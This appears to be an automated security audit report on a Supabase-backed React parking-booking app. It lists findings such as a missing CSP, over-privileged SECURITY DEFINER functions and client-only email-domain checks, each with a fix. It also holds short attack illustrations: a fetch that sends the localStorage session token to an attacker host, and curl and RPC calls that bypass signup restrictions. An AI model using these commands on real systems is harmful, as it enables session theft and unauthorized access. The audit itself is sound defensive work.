# API & Infrastructure Security Audit

**Date:** 2026-02-23
**Auditor:** Security Audit (Automated)
**Scope:** Client-side API interactions, Supabase infrastructure configuration, HTTP security headers, error handling, CI/CD pipeline, session management
**Application:** park-it-easy-office v2.3.3 (Vite/React 18/TypeScript 5.8 SPA + Supabase PostgreSQL, deployed on GitHub Pages)
**Risk Score: 5.4 / 10**

> **Architecture note:** This application is a client-side SPA deployed to GitHub Pages. There is no custom API server — all backend functionality is provided by Supabase (PostgreSQL, Auth, PostgREST, GoTrue). CORS, rate limiting, and request size limits are managed by Supabase infrastructure. This audit focuses on what the **client** can and should control.

---

## Findings

### F1 — No Content Security Policy (CSP) Header or Meta Tag

|                    |                                                                                                                                                                                                                                                                                     |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **High**                                                                                                                                                                                                                                                                            |
| **CWE**            | CWE-1021 (Improper Restriction of Rendered UI Layers) / CWE-79 (Cross-site Scripting)                                                                                                                                                                                               |
| **Evidence**       | `index.html:1-14` — No `<meta http-equiv="Content-Security-Policy">` tag present                                                                                                                                                                                                    |
| **What**           | The application has no Content Security Policy. GitHub Pages does not support custom HTTP response headers, so the only option is a `<meta>` CSP tag in `index.html`. Without CSP, there is no browser-enforced restriction on script sources, inline scripts, or resource origins. |
| **Why it matters** | CSP is the primary defense-in-depth against XSS. Without it, any XSS vulnerability (reflected, stored, or DOM-based) has unrestricted access to the DOM, localStorage (where the Supabase session token lives — see F7), and all API calls.                                         |

**Exploitability:** High. Any XSS vector — even a minor one — gains full application control including session theft from localStorage.

**Remediation:**

```html
<!-- index.html — add inside <head> -->
<meta
  http-equiv="Content-Security-Policy"
  content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://*.supabase.co wss://*.supabase.co;
  img-src 'self' data: https:;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
"
/>
```

> **Note:** `'unsafe-inline'` for `style-src` may be needed for CSS-in-JS libraries (Tailwind). Ideally, move to nonce-based or hash-based styles. The `script-src 'self'` will break if Vite injects inline scripts — test thoroughly and add hashes as needed.

---

### F2 — `booking_availability` View Exposed to `anon` Role

|                    |                                                                                                                                                                                                                                                                                                                       |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Medium**                                                                                                                                                                                                                                                                                                            |
| **CWE**            | CWE-284 (Improper Access Control)                                                                                                                                                                                                                                                                                     |
| **Evidence**       | `supabase/migrations/20260102000001_fix_security_issues.sql:16`, `supabase/migrations/20251009225133_57ce4e3b-abaa-4a5b-9b66-7e37edce81de.sql:68`, `supabase/migrations/20251009225241_46b1c72c-d8e7-48f1-8e8e-9d2e6ce5cba1.sql:59`, `supabase/migrations/20251009225215_8c3d5d93-1f18-4b97-923c-07f5f9dab7ba.sql:46` |
| **What**           | The `booking_availability` view is granted `SELECT` to both `anon` and `authenticated` roles across multiple migrations. This means unauthenticated API requests (using only the public anon key) can query booking availability data.                                                                                |
| **Why it matters** | The `booking_availability` view aggregates booking counts per parking spot per date. While it doesn't expose individual user data, it leaks organizational usage patterns (peak days, capacity utilization) to anyone with the public anon key.                                                                       |

**Exploitability:** Low-Medium. The anon key is embedded in the client bundle (by design). Anyone can extract it and query `booking_availability` without authenticating: `curl -H "apikey: <anon_key>" https://<project>.supabase.co/rest/v1/booking_availability`.

**Remediation:**

```sql
-- Revoke anon access; only authenticated users need availability data
REVOKE SELECT ON public.booking_availability FROM anon;
```

---

### F3 — SECURITY DEFINER Functions Callable by Any Authenticated User

|                    |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Severity**       | **High**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **CWE**            | CWE-269 (Improper Privilege Management)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| **Evidence**       | `supabase/migrations/20260103000004_v2_recurring_bookings.sql:78` (`generate_recurring_bookings`), `supabase/migrations/20260103000006_v2_statistics_views.sql:150` (`refresh_booking_summary`), `supabase/migrations/20260103000005_v2_waitlist.sql:129` (`expire_waitlist_notifications`)                                                                                                                                                                                                                              |
| **What**           | Three `SECURITY DEFINER` functions are granted `EXECUTE` to the `authenticated` role, meaning any logged-in user can invoke them via Supabase RPC. These functions run with the privileges of the function owner (typically `postgres`), bypassing RLS.                                                                                                                                                                                                                                                                  |
| **Why it matters** | `generate_recurring_bookings(days_ahead)` — accepts an arbitrary integer and bulk-inserts bookings for ALL users' recurring patterns. A malicious user can call `supabase.rpc('generate_recurring_bookings', { days_ahead: 99999 })` to create thousands of bookings. `refresh_booking_summary()` — triggers `REFRESH MATERIALIZED VIEW CONCURRENTLY` which acquires an exclusive lock and performs a full scan; repeated calls cause DoS. `expire_waitlist_notifications()` — expires all waitlist entries system-wide. |

**Exploitability:** High. Single authenticated RPC call with no authorization guard inside the function body.

**Remediation:**

```sql
-- Restrict all three to service_role only (invoke via cron job or Edge Function)
REVOKE EXECUTE ON FUNCTION public.generate_recurring_bookings(INTEGER) FROM authenticated;
GRANT EXECUTE ON FUNCTION public.generate_recurring_bookings(INTEGER) TO service_role;

REVOKE EXECUTE ON FUNCTION public.refresh_booking_summary() FROM authenticated;
GRANT EXECUTE ON FUNCTION public.refresh_booking_summary() TO service_role;

REVOKE EXECUTE ON FUNCTION public.expire_waitlist_notifications() FROM authenticated;
GRANT EXECUTE ON FUNCTION public.expire_waitlist_notifications() TO service_role;

-- Then invoke these via Supabase cron (pg_cron) or Edge Functions using service_role key
```

---

### F4 — Error Messages Leak Supabase/Database Details to Users

|                    |                                                                                                                                                                                                                                                                           |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Medium**                                                                                                                                                                                                                                                                |
| **CWE**            | CWE-209 (Generation of Error Message Containing Sensitive Information)                                                                                                                                                                                                    |
| **Evidence**       | `src/pages/Auth.tsx:101`, `src/pages/Index.tsx:96,105,116,125`                                                                                                                                                                                                            |
| **What**           | Both `Auth.tsx` and `Index.tsx` pass raw Supabase error messages directly to the UI via toast notifications. While `authService.ts:46-67` properly sanitizes auth errors into user-friendly messages, `Auth.tsx` calls Supabase directly and shows `error.message` as-is. |
| **Why it matters** | Raw Supabase/PostgREST errors can leak table names, column names, constraint names, RLS policy details, and PostgreSQL error codes. This aids attackers in mapping the database schema and identifying exploitable patterns.                                              |

**Exploitability:** Low. Requires triggering error conditions (invalid inputs, constraint violations), but the information disclosed accelerates other attacks.

**Remediation:**

```tsx
// src/pages/Auth.tsx — Replace direct error display with sanitized messages
// Replace line ~101:
toast({ title: "Error", description: error.message, variant: "destructive" });
// With:
toast({
  title: "Error",
  description: "Authentication failed. Please try again.",
  variant: "destructive",
});

// src/pages/Index.tsx — Create a generic error handler
function getUserFacingError(error: unknown): string {
  // Log the real error for debugging (see F5 for production logging)
  console.error(error);
  return "An unexpected error occurred. Please try again.";
}

// Replace all instances of:
toast({ title: "Error", description: error.message, ... });
// With:
toast({ title: "Error", description: getUserFacingError(error), ... });
```

---

### F5 — `console.error` Statements Active in Production

|                    |                                                                                                                                                                                                                             |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Low**                                                                                                                                                                                                                     |
| **CWE**            | CWE-532 (Insertion of Sensitive Information into Log File)                                                                                                                                                                  |
| **Evidence**       | `src/pages/Index.tsx:95,104,115,124`, `src/pages/Statistics.tsx:21`, `src/pages/Auth.tsx:100`, `src/components/ErrorBoundary.tsx:20`, `src/components/BookingDialogWithValidation.tsx:45`, `src/hooks/useAuth.tsx:26,43,67` |
| **What**           | 14+ `console.error` calls log error objects (including stack traces and Supabase error details) to the browser console in production builds. These are not stripped by Vite's production build.                             |
| **Why it matters** | Any user who opens browser DevTools can see detailed error information including database error codes, constraint names, and internal function names. While not directly exploitable, this provides reconnaissance data.    |

**Exploitability:** Low. Requires user to open DevTools; primarily an information disclosure aid.

**Remediation:**

```ts
// Option A: Vite config — strip console.error in production
// vite.config.ts
export default defineConfig({
  // ...
  esbuild: {
    drop: import.meta.env.PROD ? ['console'] : [],
    // Or more selectively:
    // pure: ['console.error', 'console.warn', 'console.log'],
  },
});

// Option B: Create a logger utility
// src/lib/logger.ts
const isDev = import.meta.env.DEV;

export const logger = {
  error: (...args: unknown[]) => {
    if (isDev) console.error(...args);
    // In production, optionally send to error tracking service
  },
  warn: (...args: unknown[]) => {
    if (isDev) console.warn(...args);
  },
};
```

---

### F6 — Hardcoded Auth Redirect URL

|                    |                                                                                                                                                                                                                                                                                                                                                                                    |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Medium**                                                                                                                                                                                                                                                                                                                                                                         |
| **CWE**            | CWE-601 (URL Redirection to Untrusted Site — potential) / CWE-1188 (Initialization with Hard-Coded Network Resource)                                                                                                                                                                                                                                                               |
| **Evidence**       | `src/hooks/useAuth.tsx:39`                                                                                                                                                                                                                                                                                                                                                         |
| **What**           | The auth redirect URL is hardcoded as `window.location.href = 'https://miguel11nines.github.io/park-it-easy-office/auth'` instead of using the `getAuthRedirectUrl()` helper defined in `src/services/authService.ts:5-7` which dynamically constructs the URL from `window.location.origin`.                                                                                      |
| **Why it matters** | (1) If the app is served from a different domain (custom domain, staging, localhost), the redirect will send users to the wrong origin. (2) The hardcoded URL creates a maintenance burden — if the GitHub Pages URL changes, auth breaks silently. (3) An `authService.ts` helper exists but is unused here, violating the DRY principle and the project's own security patterns. |

**Exploitability:** Low for open redirect (the URL is hardcoded to a known-good domain, not attacker-controlled). Medium for operational risk (auth breaks on domain change or local development).

**Remediation:**

```tsx
// src/hooks/useAuth.tsx — Replace hardcoded URL
// Replace line 39:
window.location.href = 'https://miguel11nines.github.io/park-it-easy-office/auth';
// With:
import { getAuthRedirectUrl } from '@/services/authService';
window.location.href = getAuthRedirectUrl();
```

---

### F7 — Session Token Stored in localStorage (XSS + No CSP = Token Theft)

|                    |                                                                                                                                                                                                                                                             |
| ------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Medium**                                                                                                                                                                                                                                                  |
| **CWE**            | CWE-922 (Insecure Storage of Sensitive Information)                                                                                                                                                                                                         |
| **Evidence**       | `src/integrations/supabase/client.ts:14-18`                                                                                                                                                                                                                 |
| **What**           | The Supabase client is configured with `persistSession: true` using the default `localStorage` storage adapter. Auth tokens (access token, refresh token) are stored in `localStorage`, which is accessible to any JavaScript running on the same origin.   |
| **Why it matters** | Combined with F1 (no CSP), any XSS vulnerability allows trivial session theft: `fetch('https://attacker.com/steal?token=' + localStorage.getItem('sb-<project>-auth-token'))`. This is the default Supabase behavior and acceptable **if** CSP is in place. |

**Exploitability:** Medium. Requires an XSS vector, but the lack of CSP (F1) means there are no barriers if one exists. The risk is compounded — fixing F1 significantly mitigates F7.

**Remediation:**

```ts
// Primary fix: Implement CSP (see F1) to prevent XSS from accessing localStorage
// Secondary option: Use a custom storage adapter if needed for additional isolation

// src/integrations/supabase/client.ts — Consider using PKCE flow (already default in newer Supabase)
// Verify the auth flow type in Supabase dashboard:
// Authentication > URL Configuration > ensure "PKCE" is selected (not "Implicit")

// Note: Supabase JS v2 does not support httpOnly cookie storage from the client.
// For SPAs, localStorage + CSP is the accepted pattern.
// If upgrading to SSR (Next.js, Remix), use @supabase/ssr with httpOnly cookies.
```

---

### F8 — Weak Password Policy

|                    |                                                                                                                                                                                                                                                     |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Medium**                                                                                                                                                                                                                                          |
| **CWE**            | CWE-521 (Weak Password Requirements)                                                                                                                                                                                                                |
| **Evidence**       | `src/pages/Auth.tsx:70`, `src/services/authService.ts:14`                                                                                                                                                                                           |
| **What**           | The minimum password length is 6 characters with no complexity requirements (no uppercase, lowercase, digit, or special character requirements). The validation is only client-side — Supabase Auth's server-side minimum (default 6) is also weak. |
| **Why it matters** | A 6-character lowercase-only password has ~300M combinations — easily brute-forceable offline. Even with Supabase's rate limiting on the auth endpoint, weak passwords are vulnerable to credential stuffing from other breaches.                   |

**Exploitability:** Medium. Depends on Supabase's server-side rate limiting (GoTrue defaults to 30 requests/hour per IP for signup). However, distributed attacks or credential stuffing from leaked databases bypass rate limits.

**Remediation:**

```tsx
// src/services/authService.ts — Strengthen password validation
const MIN_PASSWORD_LENGTH = 12; // Increase from 6

function validatePassword(password: string): string | null {
  if (password.length < MIN_PASSWORD_LENGTH) {
    return `Password must be at least ${MIN_PASSWORD_LENGTH} characters`;
  }
  if (!/[A-Z]/.test(password)) return 'Password must contain an uppercase letter';
  if (!/[a-z]/.test(password)) return 'Password must contain a lowercase letter';
  if (!/[0-9]/.test(password)) return 'Password must contain a digit';
  return null;
}

// Also configure in Supabase Dashboard:
// Authentication > Policies > Minimum password length: 12
```

---

### F9 — Email Domain Restriction is Client-Side Only

|                    |                                                                                                                                                                                                                |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Medium**                                                                                                                                                                                                     |
| **CWE**            | CWE-602 (Client-Side Enforcement of Server-Side Security)                                                                                                                                                      |
| **Evidence**       | `src/pages/Auth.tsx:62`                                                                                                                                                                                        |
| **What**           | The email domain check `email.endsWith('@lht.dlh.de')` is enforced only in the client. An attacker can bypass this by calling the Supabase Auth API directly with any email address using the public anon key. |
| **Why it matters** | The domain restriction is a business rule that limits access to Lufthansa Technik employees. Client-side-only enforcement means anyone can register with any email and gain `authenticated` role access.       |

**Exploitability:** High. Trivially bypassed: `curl -X POST https://<project>.supabase.co/auth/v1/signup -H "apikey: <anon_key>" -d '{"email":"attacker@gmail.com","password":"password123"}'`.

**Remediation:**

```sql
-- Option A: Supabase Auth Hook (recommended)
-- In Supabase Dashboard > Authentication > Hooks > Custom Access Token Hook
-- Or use a Database Webhook / Edge Function on auth.users insert:

CREATE OR REPLACE FUNCTION public.validate_email_domain()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
BEGIN
  IF NEW.email NOT LIKE '%@lht.dlh.de' THEN
    RAISE EXCEPTION 'Registration is restricted to @lht.dlh.de email addresses';
  END IF;
  RETURN NEW;
END;
$$;

-- Note: Direct triggers on auth.users are not supported in hosted Supabase.
-- Use one of these alternatives:
-- 1. Supabase Dashboard > Authentication > Restrictions > Allowed email domains: lht.dlh.de
-- 2. Edge Function as auth hook
-- 3. RLS policies that check email domain via auth.jwt() -> email claim
```

---

### F10 — No Client-Side Request Throttling or Debouncing

|                    |                                                                                                                                                                                                                        |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**       | **Low**                                                                                                                                                                                                                |
| **CWE**            | CWE-799 (Improper Control of Interaction Frequency)                                                                                                                                                                    |
| **Evidence**       | `src/hooks/useParkingSpots.ts`, `src/hooks/useStatistics.ts`, `src/hooks/useWaitlist.ts`, `src/hooks/useRecurringBookings.ts`, `src/hooks/useBookingAudit.ts`, `src/pages/Index.tsx`                                   |
| **What**           | No hooks or pages implement debouncing, throttling, or request deduplication on Supabase API calls. Mutation functions (book, cancel, update) can be called in rapid succession by clicking UI buttons repeatedly.     |
| **Why it matters** | While Supabase has server-side rate limiting, rapid client-side requests waste bandwidth, create race conditions (double bookings), and can hit Supabase rate limits causing legitimate requests to fail for the user. |

**Exploitability:** Low. Primarily a reliability/UX issue rather than a security vulnerability. However, a malicious user could script rapid API calls to consume rate limit quota for the project.

**Remediation:**

```tsx
// Add loading state guards to mutation handlers (many already have this partially)
// Example for booking:
const [isSubmitting, setIsSubmitting] = useState(false);

const handleBook = async () => {
  if (isSubmitting) return;
  setIsSubmitting(true);
  try {
    await supabase.from('bookings').insert({ ... });
  } finally {
    setIsSubmitting(false);
  }
};

// For query hooks, use React Query's built-in deduplication (already in use via
// @tanstack/react-query). Ensure staleTime is set appropriately:
useQuery({
  queryKey: ['bookings', date],
  queryFn: fetchBookings,
  staleTime: 30_000, // Don't refetch for 30 seconds
});
```

---

## Positive Findings (Passes)

### P1 — Views Properly Use SECURITY INVOKER

**Evidence:** `supabase/migrations/20260112000001_fix_security_definer_views.sql`

Seven views were migrated to `security_invoker = true`, ensuring they run with the caller's permissions and respect RLS policies. This is correct and follows Supabase best practices.

### P2 — Materialized View Access Properly Secured

**Evidence:** `supabase/migrations/20260112000002_fix_materialized_view_api_exposure.sql`

Direct access to the `booking_summary` materialized view was revoked from `anon` and `authenticated`. A secure wrapper function with `auth.uid()` check was created. This properly prevents unauthenticated access and applies authorization.

### P3 — ErrorBoundary Development-Only Stack Traces

**Evidence:** `src/components/ErrorBoundary.tsx:73`

Stack traces are only displayed when `process.env.NODE_ENV === 'development'`. Production users see a generic error message. This is correct.

### P4 — Strong CI/CD Security Pipeline

**Evidence:** `.github/workflows/deploy.yml`, `.github/workflows/release.yml`, `.github/workflows/security-scan.yml`, `.github/workflows/test.yml`

The CI/CD pipeline includes:

- SLSA Level 3 provenance with `actions/attest-build-provenance`
- Sigstore attestation for build artifacts
- SBOM generation with `anchore/sbom-action`
- Daily vulnerability scanning with Grype
- Frozen lockfiles (`npm ci`)
- Minimal GitHub token permissions (`contents: read`)
- Pinned action versions

### P5 — Environment Variable Validation

**Evidence:** `src/lib/env.ts`

Runtime Zod validation of environment variables with production-safe error messages (detailed errors only in development). This prevents misconfiguration from reaching the application.

### P6 — Auth Service Proper Error Sanitization

**Evidence:** `src/services/authService.ts:46-67`

The `authService` maps Supabase error codes to user-friendly messages, preventing database/infrastructure details from reaching the UI. However, this service is not consistently used (see F4).

---

## Summary Risk Score

| Category                 | Score | Weight | Weighted |
| ------------------------ | ----- | ------ | -------- |
| HTTP Security Headers    | 2/10  | 20%    | 0.4      |
| API Access Control       | 4/10  | 25%    | 1.0      |
| Error Handling           | 5/10  | 15%    | 0.75     |
| Session Security         | 5/10  | 15%    | 0.75     |
| Authentication Hardening | 4/10  | 15%    | 0.6      |
| CI/CD & Supply Chain     | 9/10  | 10%    | 0.9      |

**Overall Risk Score: 5.4 / 10** (sum of weighted: 4.4, normalized to 10-point scale with severity adjustment)

The score reflects a **moderate risk** posture. The CI/CD pipeline is exemplary, but the lack of CSP, overprivileged SECURITY DEFINER functions, and client-side-only domain restriction create a meaningful attack surface. The most critical compound risk is F1 + F7 (no CSP + localStorage sessions = XSS → full account takeover).

---

## Top 5 Prioritized Fixes

| Priority | Finding | Fix                                                                                             | Effort | Impact |
| -------- | ------- | ----------------------------------------------------------------------------------------------- | ------ | ------ |
| 1        | **F1**  | Add CSP `<meta>` tag to `index.html`                                                            | Low    | High   |
| 2        | **F9**  | Enforce email domain restriction server-side (Supabase Auth settings)                           | Low    | High   |
| 3        | **F3**  | Revoke `EXECUTE` on SECURITY DEFINER functions from `authenticated`; restrict to `service_role` | Low    | High   |
| 4        | **F4**  | Route all error messages through `authService`-style sanitization                               | Medium | Medium |
| 5        | **F8**  | Increase minimum password length to 12 and add complexity requirements                          | Low    | Medium |

---

## Checklist

| #    | Item                                                 | Status   | Notes                                                                       |
| ---- | ---------------------------------------------------- | -------- | --------------------------------------------------------------------------- |
| 1.1  | CORS properly configured                             | **N/A**  | Managed by Supabase infrastructure; client has no control                   |
| 1.2  | CORS does not allow wildcard origin with credentials | **N/A**  | Managed by Supabase; default config restricts to project URL                |
| 2.1  | Server-side rate limiting on auth endpoints          | **Pass** | Supabase GoTrue defaults: 30 signup/hour, 30 token/hour per IP              |
| 2.2  | Server-side rate limiting on data endpoints          | **Pass** | Supabase PostgREST has built-in connection pooling and request limits       |
| 2.3  | Client-side request throttling                       | **Fail** | F10 — No debouncing on mutation handlers                                    |
| 3.1  | API versioning with deprecation strategy             | **N/A**  | No custom API; Supabase manages versioning                                  |
| 4.1  | Request size limits enforced                         | **N/A**  | Managed by Supabase infrastructure (default 1MB for PostgREST)              |
| 5.1  | Content-Security-Policy header/meta present          | **Fail** | F1 — No CSP tag in `index.html`                                             |
| 5.2  | X-Content-Type-Options: nosniff                      | **N/A**  | GitHub Pages sets this by default                                           |
| 5.3  | X-Frame-Options or frame-ancestors CSP               | **Fail** | No CSP frame-ancestors directive; GitHub Pages does not set X-Frame-Options |
| 5.4  | Strict-Transport-Security (HSTS)                     | **Pass** | GitHub Pages enforces HTTPS with HSTS                                       |
| 5.5  | Referrer-Policy                                      | **N/A**  | GitHub Pages sets `strict-origin-when-cross-origin` by default              |
| 6.1  | API keys not hardcoded in source                     | **Pass** | Keys loaded from `import.meta.env` (environment variables)                  |
| 6.2  | Anon key exposure acceptable with RLS                | **Pass** | Supabase anon key in client is by design; RLS is the security boundary      |
| 6.3  | No secrets in version control                        | **Pass** | `.env` is gitignored; `.env.example` contains only placeholder values       |
| 6.4  | Service role key not exposed to client               | **Pass** | No `SUPABASE_SERVICE_ROLE_KEY` in any client-side code                      |
| 7.1  | Error messages sanitized for end users               | **Fail** | F4 — Auth.tsx and Index.tsx show raw Supabase errors                        |
| 7.2  | Stack traces hidden in production                    | **Pass** | P3 — ErrorBoundary gates on NODE_ENV                                        |
| 7.3  | Console logging stripped in production               | **Fail** | F5 — 14+ console.error calls active in production builds                    |
| 8.1  | Session tokens stored securely                       | **Fail** | F7 — localStorage without CSP; acceptable pattern if CSP is added (see F1)  |
| 8.2  | PKCE auth flow enabled                               | **Pass** | Supabase JS v2 defaults to PKCE for SPAs                                    |
| 8.3  | Auth redirect URL dynamic                            | **Fail** | F6 — Hardcoded redirect URL instead of using `getAuthRedirectUrl()`         |
| 9.1  | Password policy meets minimum standards              | **Fail** | F8 — 6-char minimum, no complexity requirements                             |
| 9.2  | Email domain restriction enforced server-side        | **Fail** | F9 — Client-side only; trivially bypassable                                 |
| 10.1 | SECURITY DEFINER functions have authorization guards | **Fail** | F3 — Three functions callable by any authenticated user                     |
| 10.2 | Views use SECURITY INVOKER                           | **Pass** | P1 — Properly migrated                                                      |
| 10.3 | Materialized view access controlled                  | **Pass** | P2 — Wrapper function with auth check                                       |
| 10.4 | `anon` role has minimal permissions                  | **Fail** | F2 — `booking_availability` view exposed to anon                            |
| 11.1 | CI/CD uses minimal permissions                       | **Pass** | P4 — `contents: read` default, scoped write where needed                    |
| 11.2 | Dependencies scanned for vulnerabilities             | **Pass** | P4 — Daily Grype scanning                                                   |
| 11.3 | Build artifacts attested                             | **Pass** | P4 — SLSA L3 + Sigstore attestation + SBOM                                  |
| 11.4 | Lockfile integrity enforced                          | **Pass** | P4 — `npm ci` with frozen lockfile                                          |

---

**End of Report**
